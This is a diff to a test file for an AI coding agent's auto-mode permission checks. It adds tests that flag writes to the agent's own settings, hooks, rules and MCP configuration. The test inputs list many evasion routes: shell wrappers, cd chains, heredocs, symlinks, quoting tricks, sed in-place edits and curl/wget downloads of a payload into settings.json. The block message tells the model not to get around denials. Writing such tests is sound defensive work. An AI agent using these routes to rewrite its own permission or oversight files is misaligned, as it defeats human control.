@@ -5,21 +5,27 @@
  */
 
 import { describe, it, expect, vi } from 'vitest';
+import fs from 'node:fs';
+import os from 'node:os';
+import path from 'node:path';
 import {
   SAFE_TOOL_ALLOWLIST,
   applyAutoModeDecision,
   evaluateAutoMode,
   formatClassifierBlockMessage,
   getAutoModePermissionDeniedReason,
+  isAutoModeProtectedWritePath,
   isInSafeToolAllowlist,
   shouldFirePermissionDeniedForAutoMode,
   passesAcceptEditsFastPath,
+  shouldForceAutoModeReviewForAllow,
   shouldRunAutoModeForCall,
 } from './autoMode.js';
 import { ApprovalMode } from '../config/config.js';
 import { ToolNames } from '../tools/tool-names.js';
 import type { Config } from '../config/config.js';
 import type { PermissionCheckContext } from './types.js';
+import { setGeminiMdFilename } from '../memory/const.js';
 
 // ─── SAFE_TOOL_ALLOWLIST contents (frozen) ───────────────────────────────
 
@@ -130,6 +136,190 @@ function ctx(over: Partial<PermissionCheckContext>): PermissionCheckContext {
   };
 }
 
+describe('isAutoModeProtectedWritePath', () => {
+  it('matches Qwen self-modification files and directories', () => {
+    const protectedPaths = [
+      '/repo/.hopcode/settings.json',
+      '/repo/.hopcode/settings.local.json',
+      '/repo/HOPCODE.md',
+      '/repo/AGENTS.md',
+      '/repo/.hopcode/commands/review.md',
+      '/repo/.hopcode/agents/reviewer.md',
+      '/repo/.hopcode/skills/skill-a/SKILL.md',
+      '/repo/.hopcode/hooks/pre-tool-use.json',
+      '/repo/.hopcode/HOPCODE.local.md',
+      '/repo/.hopcode/rules/backend.md',
+      '/repo/.mcp.json',
+      '/repo/.git',
+    ];
+
+    for (const filePath of protectedPaths) {
+      expect(isAutoModeProtectedWritePath(filePath)).toBe(true);
+    }
+  });
+
+  it('does not treat ordinary source files or worktree files as protected', () => {
+    const ordinaryPaths = [
+      '/repo/src/index.ts',
+      '/repo/.hopcode/PROJECT_SUMMARY.md',
+      '/repo/.hopcode/worktrees/feature/src/index.ts',
+    ];
+
+    for (const filePath of ordinaryPaths) {
+      expect(isAutoModeProtectedWritePath(filePath)).toBe(false);
+    }
+  });
+
+  it('still protects config surfaces inside managed worktrees', () => {
+    const protectedPaths = [
+      '/repo/.hopcode/worktrees/feature/.hopcode/settings.json',
+      '/repo/.hopcode/worktrees/feature/AGENTS.md',
+      '/repo/.hopcode/worktrees/feature/.hopcode/HOPCODE.local.md',
+      '/repo/.hopcode/worktrees/feature/.hopcode/rules/backend.md',
+      '/repo/.hopcode/worktrees/feature/.mcp.json',
+    ];
+
+    for (const filePath of protectedPaths) {
+      expect(isAutoModeProtectedWritePath(filePath)).toBe(true);
+    }
+  });
+
+  it('matches protected paths case-insensitively', () => {
+    const protectedPaths = [
+      '/repo/HOPCODE.md',
+      '/repo/agents.md',
+      '/repo/.hopcode/SETTINGS.JSON',
+      '/repo/.hopcode/HOPCODE.local.md',
+      '/repo/.hopcode/RULES/backend.md',
+      '/repo/.MCP.JSON',
+      '/repo/GNUmakefile',
+      '/repo/Taskfile.yaml',
+      '/repo/.Github/workflows/ci.yml',
+    ];
+
+    for (const filePath of protectedPaths) {
+      expect(isAutoModeProtectedWritePath(filePath)).toBe(true);
+    }
+  });
+
+  it('matches configured context filenames', () => {
+    setGeminiMdFilename(['CUSTOM_AGENTS.md', 'docs/TEAM_CONTEXT.md']);
+    try {
+      const protectedPaths = [
+        '/repo/CUSTOM_AGENTS.md',
+        '/repo/docs/TEAM_CONTEXT.md',
+        '/repo/.hopcode/worktrees/feature/CUSTOM_AGENTS.md',
+      ];
+
+      for (const filePath of protectedPaths) {
+        expect(isAutoModeProtectedWritePath(filePath)).toBe(true);
+      }
+    } finally {
+      setGeminiMdFilename(['HOPCODE.md', 'AGENTS.md']);
+    }
+  });
+
+  it('matches self-modification surfaces in custom HOPCODE_HOME', () => {
+    const originalhopcodeHome = process.env['HOPCODE_HOME'];
+    process.env['HOPCODE_HOME'] = '/tmp/custom-hopcode-home';
+
+    try {
+      const protectedPaths = [
+        '/tmp/custom-hopcode-home/settings.json',
+        '/tmp/custom-hopcode-home/settings.local.json',
+        '/tmp/custom-hopcode-home/HOPCODE.local.md',
+        '/tmp/custom-hopcode-home/commands/review.md',
+        '/tmp/custom-hopcode-home/agents/reviewer.md',
+        '/tmp/custom-hopcode-home/skills/review/SKILL.md',
+        '/tmp/custom-hopcode-home/hooks/pre-tool-use.json',
+        '/tmp/custom-hopcode-home/rules/backend.md',
+        '/tmp/custom-hopcode-home/.mcp.json',
+      ];
+
+      for (const filePath of protectedPaths) {
+        expect(isAutoModeProtectedWritePath(filePath)).toBe(true);
+      }
+    } finally {
+      if (originalhopcodeHome === undefined) {
+        delete process.env['HOPCODE_HOME'];
+      } else {
+        process.env['HOPCODE_HOME'] = originalhopcodeHome;
+      }
+    }
+  });
+
+  it('matches real paths under a symlinked custom HOPCODE_HOME', () => {
+    const originalhopcodeHome = process.env['HOPCODE_HOME'];
+    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'hopcode-home-'));
+
+    try {
+      const realHome = path.join(tmpRoot, 'real-home');
+      const linkedHome = path.join(tmpRoot, 'linked-home');
+      fs.mkdirSync(realHome, { recursive: true });
+      fs.symlinkSync(realHome, linkedHome);
+      process.env['HOPCODE_HOME'] = linkedHome;
+
+      const settingsPath = path.join(realHome, 'settings.json');
+      fs.writeFileSync(settingsPath, '{}');
+
+      expect(isAutoModeProtectedWritePath(settingsPath)).toBe(true);
+    } finally {
+      if (originalhopcodeHome === undefined) {
+        delete process.env['HOPCODE_HOME'];
+      } else {
+        process.env['HOPCODE_HOME'] = originalhopcodeHome;
+      }
+      fs.rmSync(tmpRoot, { recursive: true, force: true });
+    }
+  });
+
+  it('re-resolves write paths after symlinks are created', () => {
+    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'hopcode-write-path-'));
+
+    try {
+      const protectedDir = path.join(tmpRoot, '.hopcode');
+      const settingsPath = path.join(protectedDir, 'settings.json');
+      const linkPath = path.join(tmpRoot, 'scratch');
+      fs.mkdirSync(protectedDir, { recursive: true });
+      fs.writeFileSync(settingsPath, '{}');
+
+      expect(isAutoModeProtectedWritePath(linkPath)).toBe(false);
+
+      fs.symlinkSync(settingsPath, linkPath);
+
+      expect(isAutoModeProtectedWritePath(linkPath)).toBe(true);
+    } finally {
+      fs.rmSync(tmpRoot, { recursive: true, force: true });
+    }
+  });
+
+  it('caches normalized HOPCODE_HOME prefixes per configured home', () => {
+    const originalhopcodeHome = process.env['HOPCODE_HOME'];
+    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'hopcode-home-cache-'));
+    const realpathSpy = vi.spyOn(fs.realpathSync, 'native');
+
+    try {
+      const settingsPath = path.join(tmpRoot, 'settings.json');
+      fs.writeFileSync(settingsPath, '{}');
+      process.env['HOPCODE_HOME'] = tmpRoot;
+
+      expect(isAutoModeProtectedWritePath(settingsPath)).toBe(true);
+      expect(isAutoModeProtectedWritePath(settingsPath)).toBe(true);
+      expect(
+        realpathSpy.mock.calls.filter(([arg]) => arg === tmpRoot),
+      ).toHaveLength(1);
+    } finally {
+      realpathSpy.mockRestore();
+      if (originalhopcodeHome === undefined) {
+        delete process.env['HOPCODE_HOME'];
+      } else {
+        process.env['HOPCODE_HOME'] = originalhopcodeHome;
+      }
+      fs.rmSync(tmpRoot, { recursive: true, force: true });
+    }
+  });
+});
+
 describe('passesAcceptEditsFastPath', () => {
   const cwd = '/Users/test/project';
   const config = makeConfig([cwd]);
@@ -150,6 +340,81 @@ describe('passesAcceptEditsFastPath', () => {
         config,
       ),
     ).toBe(true);
+  });
+
+  it('rejects Qwen self-modification paths even inside cwd', () => {
+    const protectedPaths = [
+      `${cwd}/.hopcode/settings.json`,
+      `${cwd}/.hopcode/settings.local.json`,
+      `${cwd}/HOPCODE.md`,
+      `${cwd}/AGENTS.md`,
+      `${cwd}/.hopcode/commands/review.md`,
+      `${cwd}/.hopcode/agents/reviewer.md`,
+      `${cwd}/.hopcode/skills/review/SKILL.md`,
+      `${cwd}/.hopcode/hooks/pre-tool-use.json`,
+      `${cwd}/.hopcode/HOPCODE.local.md`,
+      `${cwd}/.hopcode/rules/backend.md`,
+      `${cwd}/.mcp.json`,
+    ];
+
+    for (const filePath of protectedPaths) {
+      expect(
+        passesAcceptEditsFastPath(
+          ctx({ toolName: ToolNames.WRITE_FILE, filePath }),
+          config,
+        ),
+      ).toBe(false);
+    }
+  });
+
+  it('allows ordinary files under .hopcode/worktrees but rejects nested config surfaces', () => {
+    expect(
+      passesAcceptEditsFastPath(
+        ctx({
+          toolName: ToolNames.WRITE_FILE,
+          filePath: `${cwd}/.hopcode/worktrees/feature/src/index.ts`,
+        }),
+        config,
+      ),
+    ).toBe(true);
+
+    expect(
+      passesAcceptEditsFastPath(
+        ctx({
+          toolName: ToolNames.WRITE_FILE,
+          filePath: `${cwd}/.hopcode/worktrees/feature/.hopcode/settings.json`,
+        }),
+        config,
+      ),
+    ).toBe(false);
+  });
+
+  it('rejects symlinks that resolve to protected self-modification paths', () => {
+    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'hopcode-auto-mode-'));
+    try {
+      const hopcodeDir = path.join(tmpRoot, '.hopcode');
+      fs.mkdirSync(hopcodeDir, { recursive: true });
+      const target = path.join(hopcodeDir, 'settings.json');
+      fs.writeFileSync(target, '{}');
+
+      const link = path.join(tmpRoot, 'settings-link.json');
+      fs.symlinkSync(target, link);
+
+      const cfg = {
+        getWorkspaceContext: () => ({
+          isPathWithinWorkspace: () => true,
+        }),
+      } as unknown as Config;
+
+      expect(
+        passesAcceptEditsFastPath(
+          ctx({ toolName: ToolNames.WRITE_FILE, filePath: link }),
+          cfg,
+        ),
+      ).toBe(false);
+    } finally {
+      fs.rmSync(tmpRoot, { recursive: true, force: true });
+    }
   });
 
   it('rejects EDIT targeting a path outside the workspace', () => {
@@ -239,6 +504,532 @@ describe('passesAcceptEditsFastPath', () => {
       cfg,
     );
     expect(fn).toHaveBeenCalledWith('/some/path/x.ts');
+  });
+});
+
+describe('shouldForceAutoModeReviewForAllow', () => {
+  it('returns true for Edit/Write targeting protected self-modification paths', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.EDIT,
+          filePath: '/Users/test/.hopcode/settings.json',
+        }),
+      ),
+    ).toBe(true);
+
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.WRITE_FILE,
+          filePath: '/repo/.hopcode/HOPCODE.local.md',
+        }),
+      ),
+    ).toBe(true);
+
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.NOTEBOOK_EDIT,
+          filePath: '/repo/.hopcode/skills/review/demo.ipynb',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for shell-like commands writing protected paths', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: 'echo "{}" > .hopcode/settings.json',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.MONITOR,
+          command: 'bash -lc \'echo "{}" > .hopcode/settings.json\'',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for nested wrappers writing protected paths after `cd`', () => {
+    // Regression guard: without `extractShellOperationsAcrossCommand` doing
+    // cross-segment cd tracking AND recursive wrapper unwrapping, this
+    // exact payload would slip past AUTO force-review. A user
+    // `permissions.allow: ["Bash(*)"]` rule plus this command would have
+    // silently overwritten settings.json.
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: "cd .hopcode && bash -lc 'echo {} > settings.json'",
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for relative writes after an unresolved dynamic `cd`', () => {
+    // If cwd is dynamic, the apparent resolved path is only a guess. Route
+    // back to the classifier so an allow rule cannot hide writes like
+    // `cd "$HOPCODE_HOME" && echo > settings.json`.
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: 'cd "$HOPCODE_HOME" && echo "{}" > settings.json',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns false for ordinary writes after `cd` into project subdirs', () => {
+    // Counter-case for the cd-tracking check above: cd-into-src + write a
+    // generated file should NOT force AUTO review. Otherwise every
+    // workspace-internal compound shell command would round-trip through
+    // the classifier and dilute the policy boundary's signal.
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: "cd src && bash -lc 'echo ok > generated.txt'",
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(false);
+  });
+
+  it('returns true for shell-like commands writing protected paths after cd', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: 'cd .hopcode && echo "{}" > settings.json',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.MONITOR,
+          command: 'bash -lc \'cd .hopcode && echo "{}" > settings.json\'',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for protected writes in sibling segments after shell wrappers', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: "bash -lc 'echo ok' && echo hi > .hopcode/settings.json",
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for newline-separated protected shell writes after cd', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: 'cd .hopcode\ncp /tmp/malicious settings.json',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for grouped and metacharacter-suffixed protected writes', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: "{ cd .hopcode && echo '{}' > settings.json; }",
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: '(echo > .hopcode/settings.json)',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for protected writes embedded in shell heredoc bodies', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: [
+            "bash <<'SCRIPT'",
+            "echo '{}' > .hopcode/settings.json",
+            'SCRIPT',
+          ].join('\n'),
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for protected write commands embedded in heredoc bodies', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: [
+            "bash <<'SCRIPT'",
+            'cp /tmp/payload .hopcode/settings.json',
+            'SCRIPT',
+          ].join('\n'),
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+
+    for (const command of [
+      ["bash <<'SCRIPT'", "tee .hopcode/settings.json <<< '{}'", 'SCRIPT'].join(
+        '\n',
+      ),
+      [
+        "bash <<'SCRIPT'",
+        'dd if=/tmp/payload of=.hopcode/settings.json',
+        'SCRIPT',
+      ].join('\n'),
+      [
+        "bash <<'SCRIPT'",
+        'sort -o .hopcode/settings.json /dev/null',
+        'SCRIPT',
+      ].join('\n'),
+      [
+        "bash <<'SCRIPT'",
+        "node -e \"require('fs').writeFileSync('.hopcode/settings.json', '{}')\"",
+        'SCRIPT',
+      ].join('\n'),
+    ]) {
+      expect(
+        shouldForceAutoModeReviewForAllow(
+          ctx({
+            toolName: ToolNames.SHELL,
+            command,
+            cwd: '/repo',
+          }),
+        ),
+      ).toBe(true);
+    }
+  });
+
+  it('returns true for protected write commands with variable destinations', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: 'D=.hopcode/settings.json; cp payload "$D"',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('does not force review for awk field references', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: "awk '{print $1}' data.csv",
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(false);
+  });
+
+  it('returns true for awk in-place edits to protected paths', () => {
+    for (const command of [
+      'awk -i inplace \'{gsub(/x/, "y")}1\' .hopcode/settings.json',
+      'gawk -i inplace \'{gsub(/x/, "y")}1\' .hopcode/settings.json',
+    ]) {
+      expect(
+        shouldForceAutoModeReviewForAllow(
+          ctx({
+            toolName: ToolNames.SHELL,
+            command,
+            cwd: '/repo',
+          }),
+        ),
+      ).toBe(true);
+    }
+  });
+
+  it('returns true for sort writing protected paths via output flags', () => {
+    for (const command of [
+      'sort -o .hopcode/settings.json /dev/null',
+      'sort --output=.hopcode/settings.json /dev/null',
+    ]) {
+      expect(
+        shouldForceAutoModeReviewForAllow(
+          ctx({
+            toolName: ToolNames.SHELL,
+            command,
+            cwd: '/repo',
+          }),
+        ),
+      ).toBe(true);
+    }
+  });
+
+  it('returns true for protected heredoc redirects with repeated quote tokens', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: [
+            "bash <<'SCRIPT'",
+            'echo "{}" > """.hopcode/settings.json"""',
+            'SCRIPT',
+          ].join('\n'),
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for protected clobber and fd redirects', () => {
+    for (const command of [
+      "echo '{}' >| .hopcode/settings.json",
+      "echo '{}' >& .hopcode/settings.json",
+    ]) {
+      expect(
+        shouldForceAutoModeReviewForAllow(
+          ctx({
+            toolName: ToolNames.SHELL,
+            command,
+            cwd: '/repo',
+          }),
+        ),
+      ).toBe(true);
+    }
+  });
+
+  it('returns true for ANSI-C quoted protected redirect targets', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: "echo '{}' > $'.hopcode/settings.json'",
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for bidirectional redirects to protected paths', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: 'cat <> .hopcode/settings.json',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for target-directory writes to protected filenames', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: 'cp -t .hopcode /tmp/settings.json',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for downloader output flags targeting protected paths', () => {
+    for (const command of [
+      'curl -o .hopcode/settings.json https://example.com/payload',
+      'curl -o.hopcode/settings.json https://example.com/payload',
+      'wget -O .hopcode/settings.json https://example.com/payload',
+      'wget -O.hopcode/settings.json https://example.com/payload',
+    ]) {
+      expect(
+        shouldForceAutoModeReviewForAllow(
+          ctx({
+            toolName: ToolNames.SHELL,
+            command,
+            cwd: '/repo',
+          }),
+        ),
+      ).toBe(true);
+    }
+  });
+
+  it('returns true for archive extraction commands targeting protected dirs', () => {
+    for (const command of [
+      'tar xf payload.tar -C .hopcode/skills',
+      'tar xf payload.tar -C.hopcode/skills',
+      'tar xf payload.tar --directory=.hopcode/skills',
+      'unzip payload.zip -d .hopcode/skills',
+      'unzip payload.zip -d.hopcode/skills',
+      'cpio -i -D .hopcode/skills',
+      'cpio -i -D.hopcode/skills',
+    ]) {
+      expect(
+        shouldForceAutoModeReviewForAllow(
+          ctx({
+            toolName: ToolNames.SHELL,
+            command,
+            cwd: '/repo',
+          }),
+        ),
+      ).toBe(true);
+    }
+  });
+
+  it('returns true for patch output flags targeting protected paths', () => {
+    for (const command of [
+      'patch --output=.hopcode/settings.json -i fix.patch',
+      'patch -o.hopcode/settings.json -i fix.patch',
+    ]) {
+      expect(
+        shouldForceAutoModeReviewForAllow(
+          ctx({
+            toolName: ToolNames.SHELL,
+            command,
+            cwd: '/repo',
+          }),
+        ),
+      ).toBe(true);
+    }
+  });
+
+  it('returns true for find exec writes with placeholder operands', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: 'find . -exec cp {} .hopcode/settings.json ;',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for find execdir writes with placeholder operands', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: 'find . -execdir cp {} .hopcode/settings.json ;',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(true);
+  });
+
+  it('returns true for long in-place sed/perl writes to protected paths', () => {
+    for (const command of [
+      "sed --in-place 's/x/y/' .hopcode/settings.json",
+      "sed --in-place=.bak 's/x/y/' .hopcode/settings.json",
+      "perl --in-place -e 's/x/y/' .hopcode/settings.json",
+    ]) {
+      expect(
+        shouldForceAutoModeReviewForAllow(
+          ctx({
+            toolName: ToolNames.SHELL,
+            command,
+            cwd: '/repo',
+          }),
+        ),
+      ).toBe(true);
+    }
+  });
+
+  it('returns false for read-only sed/perl commands', () => {
+    for (const command of [
+      "sed 's/a/b/' /tmp/file",
+      "perl -e 'print $_' /tmp/file",
+      "sed -n '1,10p' .hopcode/settings.json",
+    ]) {
+      expect(
+        shouldForceAutoModeReviewForAllow(
+          ctx({
+            toolName: ToolNames.SHELL,
+            command,
+            cwd: '/repo',
+          }),
+        ),
+      ).toBe(false);
+    }
+  });
+
+  it('uses the provided cwd fallback when ctx.cwd is absent', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: 'echo "{}" > .hopcode/settings.json',
+        }),
+        '/repo',
+      ),
+    ).toBe(true);
+  });
+
+  it('returns false for ordinary edits and non-edit tools', () => {
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({ toolName: ToolNames.EDIT, filePath: '/repo/src/index.ts' }),
+      ),
+    ).toBe(false);
+
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.READ_FILE,
+          filePath: '/repo/.hopcode/settings.json',
+        }),
+      ),
+    ).toBe(false);
+
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: 'echo "ok" > src/output.txt',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(false);
+
+    expect(
+      shouldForceAutoModeReviewForAllow(
+        ctx({
+          toolName: ToolNames.SHELL,
+          command: 'cd src && echo "ok" > output.txt',
+          cwd: '/repo',
+        }),
+      ),
+    ).toBe(false);
   });
 });
 
@@ -435,7 +1226,9 @@ describe('formatClassifierBlockMessage', () => {
         reason: 'Irreversible filesystem destruction',
         unavailable: false,
       }),
-    ).toBe('Blocked by auto mode policy: Irreversible filesystem destruction');
+    ).toBe(
+      'Blocked by auto mode policy: Irreversible filesystem destruction\nDo not try to complete the denied action through another tool, shell indirection, generated script, alias, symlink, config change, hook, command file, MCP configuration, encoded payload, or equivalent path. If that action is required, stop and ask the user for explicit approval. You may continue with unrelated safe work or a genuinely safer alternative that does not accomplish the denied action.',
+    );
   });
 
   it('renders an unavailable message with cause when reason is present', () => {
@@ -446,7 +1239,7 @@ describe('formatClassifierBlockMessage', () => {
         unavailable: true,
       }),
     ).toBe(
-      'Auto mode classifier unavailable (Conversation transcript exceeds classifier context window); action blocked for safety',
+      'Auto mode classifier unavailable (Conversation transcript exceeds classifier context window); action blocked for safety\nDo not try to complete the denied action through another tool, shell indirection, generated script, alias, symlink, config change, hook, command file, MCP configuration, encoded payload, or equivalent path. If that action is required, stop and ask the user for explicit approval. You may continue with unrelated safe work or a genuinely safer alternative that does not accomplish the denied action.',
     );
   });
 
@@ -457,7 +1250,9 @@ describe('formatClassifierBlockMessage', () => {
         reason: '',
         unavailable: true,
       }),
-    ).toBe('Auto mode classifier unavailable; action blocked for safety');
+    ).toBe(
+      'Auto mode classifier unavailable; action blocked for safety\nDo not try to complete the denied action through another tool, shell indirection, generated script, alias, symlink, config change, hook, command file, MCP configuration, encoded payload, or equivalent path. If that action is required, stop and ask the user for explicit approval. You may continue with unrelated safe work or a genuinely safer alternative that does not accomplish the denied action.',
+    );
   });
 });
 
